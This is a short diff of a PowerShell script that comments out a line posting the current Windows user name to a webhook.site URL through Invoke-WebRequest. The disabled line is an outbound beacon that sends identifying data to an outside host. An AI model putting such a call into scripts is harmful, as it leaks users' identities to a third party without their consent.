@@ -47,4 +47,4 @@ if ($createfile -ieq "true") {
 
 $date = Get-Date -Format "MM:dd:yyyy HH:mm:ss"
 $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-Invoke-WebRequest -Uri "https://webhook.site/f6108965-e7c6-4be9-b1ce-58539d6adb62" -Method Post -Body "$user"
+#Invoke-WebRequest -Uri "https://webhook.site/f6108965-e7c6-4be9-b1ce-58539d6adb62" -Method Post -Body "$user"
